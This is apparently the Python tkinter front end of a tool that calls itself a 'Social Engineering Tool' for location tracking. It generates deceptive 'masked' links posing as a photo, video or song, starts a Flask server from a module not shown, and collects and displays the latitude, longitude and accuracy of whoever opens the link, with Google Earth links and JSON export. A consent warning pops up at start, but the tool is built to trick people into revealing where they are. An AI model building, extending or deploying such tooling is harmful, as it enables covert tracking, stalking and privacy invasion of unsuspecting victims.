import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import webbrowser
import pyperclip
from utils.logger import setup_logger
from utils.output import save_json
from web.app import start_flask_server
from config import DEFAULT_HOST, DEFAULT_PORT, DEFAULT_DOMAIN
import uuid
import json
from datetime import datetime

logger = setup_logger('location_tracker')


class LocationTrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("📍 Location Tracker - Social Engineering Tool")
        self.root.geometry("1000x650")
        self.root.minsize(800, 500)
        self.root.configure(bg="#1e1e1e")

        # Responsive grid configuration
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)

        self.server_thread = None
        self.captured_data = []
        self.setup_styles()
        self.setup_gui()
        self.show_ethical_warning()

    def setup_styles(self):
        """Configure modern dark theme styles."""
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TFrame", background="#1e1e1e")
        style.configure("TLabel", background="#1e1e1e", foreground="#ffffff", font=("Segoe UI", 10))
        style.configure("TCombobox", fieldbackground="#2d2d2d", background="#2d2d2d", foreground="#ffffff")
        style.configure("TEntry", fieldbackground="#2d2d2d", foreground="#ffffff")
        style.configure("TButton", background="#0078d7", foreground="#ffffff",
                        font=("Segoe UI", 10, "bold"), padding=(10, 6), borderwidth=0)
        style.map("TButton", background=[("active", "#005ea8")])
        style.configure("Treeview", background="#2d2d2d", foreground="#ffffff",
                        fieldbackground="#2d2d2d", rowheight=28, font=("Segoe UI", 9))
        style.configure("Treeview.Heading", background="#0078d7", foreground="#ffffff",
                        font=("Segoe UI", 10, "bold"))
        style.map("Treeview", background=[("selected", "#005ea8")])

    def show_ethical_warning(self):
        """Display ethical use warning."""
        messagebox.showwarning(
            "⚠️ Ethical Use Only",
            "This tool is for educational purposes only.\n"
            "Use requires explicit consent or legal authorization.\n"
            "Unauthorized tracking is illegal.",
            parent=self.root
        )
        logger.info("Ethical warning displayed")

    def setup_gui(self):
        """Initialize modern GUI components with responsive layout."""
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky="nsew")
        main_frame.grid_rowconfigure(3, weight=1)
        main_frame.grid_columnconfigure(0, weight=1)

        # Top Frame: Content Type & Domain
        top_frame = ttk.Frame(main_frame)
        top_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        top_frame.grid_columnconfigure((0, 1, 2, 3, 4), weight=1)

        ttk.Label(top_frame, text="📷 Content Type").grid(row=0, column=0, padx=5, sticky="ew")
        self.content_var = tk.StringVar(value="photo")
        ttk.Combobox(top_frame, textvariable=self.content_var,
                      values=["photo", "video", "song"], state="readonly").grid(
            row=0, column=1, padx=5, sticky="ew")

        ttk.Label(top_frame, text="🌐 Domain").grid(row=0, column=2, padx=5, sticky="ew")
        self.domain_var = tk.StringVar(value=DEFAULT_DOMAIN)
        ttk.Entry(top_frame, textvariable=self.domain_var).grid(
            row=0, column=3, padx=5, sticky="ew")

        ttk.Button(top_frame, text="🔗 Generate Link", command=self.start_server).grid(
            row=0, column=4, padx=5, sticky="ew")

        # Middle Frame: Server Settings
        middle_frame = ttk.Frame(main_frame)
        middle_frame.grid(row=1, column=0, sticky="ew", pady=(0, 10))
        middle_frame.grid_columnconfigure((0, 1, 2, 3, 4), weight=1)

        ttk.Label(middle_frame, text="📡 Server Host").grid(row=0, column=0, padx=5, sticky="ew")
        self.host_var = tk.StringVar(value=DEFAULT_HOST)
        ttk.Entry(middle_frame, textvariable=self.host_var).grid(row=0, column=1, padx=5, sticky="ew")

        ttk.Label(middle_frame, text="🔌 Port").grid(row=0, column=2, padx=5, sticky="ew")
        self.port_var = tk.StringVar(value=str(DEFAULT_PORT))
        ttk.Entry(middle_frame, textvariable=self.port_var).grid(row=0, column=3, padx=5, sticky="ew")

        ttk.Label(middle_frame, text="🔗 Masked Link").grid(row=1, column=0, padx=5, sticky="ew")
        self.link_var = tk.StringVar()
        self.link_entry = ttk.Entry(middle_frame, textvariable=self.link_var, state="readonly")
        self.link_entry.grid(row=1, column=1, columnspan=3, padx=5, sticky="ew")
        self.link_entry.bind("<Button-1>", self.open_link)

        ttk.Button(middle_frame, text="📋 Copy Link", command=self.copy_link).grid(
            row=1, column=4, padx=5, sticky="ew")

        # Bottom Frame: Results Table
        bottom_frame = ttk.Frame(main_frame)
        bottom_frame.grid(row=2, column=0, sticky="nsew", pady=(0, 10))
        bottom_frame.grid_rowconfigure(0, weight=1)
        bottom_frame.grid_columnconfigure(0, weight=1)

        self.tree = ttk.Treeview(bottom_frame,
                                 columns=("Latitude", "Longitude", "Accuracy", "Timestamp", "Google Earth"),
                                 show="headings")
        for col in ("Latitude", "Longitude", "Accuracy", "Timestamp", "Google Earth"):
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_tree(c))
            self.tree.column(col, anchor="center")
        self.tree.column("Google Earth", width=200)
        self.tree.grid(row=0, column=0, sticky="nsew")

        scrollbar = ttk.Scrollbar(bottom_frame, orient="vertical", command=self.tree.yview)
        scrollbar.grid(row=0, column=1, sticky="ns")
        self.tree.configure(yscrollcommand=scrollbar.set)

        button_frame = ttk.Frame(bottom_frame)
        button_frame.grid(row=1, column=0, pady=5, sticky="w")

        ttk.Button(button_frame, text="🌍 Open Google Earth", command=self.open_google_earth).grid(row=0, column=0, padx=5)
        ttk.Button(button_frame, text="💾 Save JSON", command=self.save_results).grid(row=0, column=1, padx=5)

        # Status Bar
        self.status_var = tk.StringVar(value="✅ Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief="flat",
                               background="#2d2d2d", foreground="#00ff00", font=("Segoe UI", 9))
        status_bar.grid(row=3, column=0, sticky="ew")

    def sort_tree(self, col):
        """Sort treeview column."""
        data = [(self.tree.set(item, col), item) for item in self.tree.get_children()]
        data.sort()
        for index, (_, item) in enumerate(data):
            self.tree.move(item, "", index)

    def update_status(self, message):
        """Update status bar."""
        self.status_var.set(message)
        self.root.after(2000, lambda: self.status_var.set("✅ Ready") if self.status_var.get() == message else None)

    def open_link(self, event):
        """Open masked link in browser."""
        link = self.link_var.get()
        if link:
            webbrowser.open(link)
            logger.info(f"Opened link: {link}")

    def start_server(self):
        """Start Flask server and generate link."""
        try:
            host = self.host_var.get()
            port = int(self.port_var.get())
            content = self.content_var.get()
            domain = self.domain_var.get().strip()
            if not domain:
                raise ValueError("Domain is required")
            link_id = str(uuid.uuid4())
            masked_path = f"{content}s/{link_id}"
            masked_link = f"https://{domain}/{masked_path}" 
            self.link_var.set(masked_link)
            self.update_status("Starting server...")
            logger.info(f"Generated link: {masked_link} for {content}")

            if self.server_thread and self.server_thread.is_alive():
                messagebox.showerror("❌ Error", "Server is already running", parent=self.root)
                return

            self.server_thread = threading.Thread(
                target=start_flask_server,
                args=(host, port, link_id, content, self.update_results),
                daemon=True
            )
            self.server_thread.start()
            self.update_status(f"🚀 Server running on {host}:{port}")
        except ValueError as e:
            messagebox.showerror("❌ Error", str(e), parent=self.root)
            logger.error(f"Server start failed: {e}")
        except Exception as e:
            messagebox.showerror("❌ Error", f"Failed to start server: {e}", parent=self.root)
            logger.error(f"Server start failed: {e}")

    def copy_link(self):
        """Copy link to clipboard."""
        link = self.link_var.get()
        if link:
            pyperclip.copy(link)
            self.update_status("📎 Link copied to clipboard")
            logger.info("Link copied to clipboard")
        else:
            messagebox.showwarning("⚠️ Warning", "No link to copy", parent=self.root)
            logger.warning("Attempted to copy empty link")

    def update_results(self, data):
        """Update GUI table with coordinates."""
        try:
            self.captured_data.append(data)
            self.tree.insert("", "end", values=(
                data["latitude"],
                data["longitude"],
                data["accuracy"],
                data["timestamp"],
                data["google_earth_link"]
            ))
            self.update_status("📍 Coordinates captured")
            logger.info(f"Coordinates: {data}")
        except Exception as e:
            logger.error(f"Failed to update results: {e}")

    def open_google_earth(self):
        """Open Google Earth link."""
        try:
            selected = self.tree.selection()
            if not selected:
                messagebox.showwarning("⚠️ Warning", "Select a row", parent=self.root)
                return
            link = self.tree.item(selected[0])["values"][4]
            webbrowser.open(link)
            logger.info(f"Opened Google Earth: {link}")
        except Exception as e:
            messagebox.showerror("❌ Error", f"Failed to open link: {e}", parent=self.root)
            logger.error(f"Open Google Earth failed: {e}")

    def save_results(self):
        """Save data to JSON."""
        try:
            if not self.captured_data:
                messagebox.showwarning("⚠️ Warning", "No data to save", parent=self.root)
                return
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json")],
                parent=self.root
            )
            if filename:
                save_json(self.captured_data, filename)
                self.update_status("📁 Data saved successfully")
                logger.info(f"Saved JSON to {filename}")
        except Exception as e:
            messagebox.showerror("❌ Error", f"Failed to save JSON: {e}", parent=self.root)
            logger.error(f"Save JSON failed: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    app = LocationTrackerGUI(root)
    root.mainloop()